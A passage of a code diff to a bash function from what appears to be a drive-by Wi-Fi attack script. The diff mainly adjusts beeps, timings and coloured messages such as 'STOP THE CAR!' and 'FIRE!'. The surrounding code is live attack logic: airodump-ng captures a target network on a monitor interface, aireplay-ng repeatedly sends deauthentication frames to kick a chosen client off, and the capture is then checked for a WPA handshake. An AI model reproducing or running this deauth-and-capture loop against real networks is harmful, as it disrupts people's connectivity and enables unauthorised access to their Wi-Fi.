@@ -142,19 +142,20 @@ fautocap()
 	gnome-terminal --geometry=130x20+0+320 -x airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
 	DONE=""
 	DECNT=0
-	beep -f 1000 -l 100
-	beep -f 1600 -l 200
+	beep -f 1000 -l 10
+	beep -f 1600 -l 100
 	while [ $DONE -z ] 2> /dev/null
 		do
 			clear
-			$COLOR 2;$COLOR2 1;echo " [>] STOP THE CAR! [<] ";$COLOR 9;$COLOR2 9
-			$COLOR 4;$COLOR2 3; echo " [*] TARGET $ESSID LOADED [*] ";$COLOR 9;$COLOR2 9
+			$COLOR 2;$COLOR2 1;echo " [>] STOP THE CAR! [<] ";$COLOR 9
+			echo " [*] TARGET ESSID: $ESSID LOADED [*] "
+			echo " [*] TARGET CLIENT: $CLIE LOADED [*]";$COLOR2 9
 			echo
-			sleep 1
-			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE [*]";$COLOR 9;$COLOR2 9
-			$COLOR 1;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR 9
+			sleep 0.7
+			echo " [>] FIRE! [<] "
+			$COLOR 1;$COLOR2 4;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR2 9;$COLOR 9
 			echo
-			sleep 3.5
+			sleep 3
 			$COLOR 4;echo " [*] Analyzing pcap for handshake [*] ";$COLOR 9
 			DONE2=""
 			fanalyze
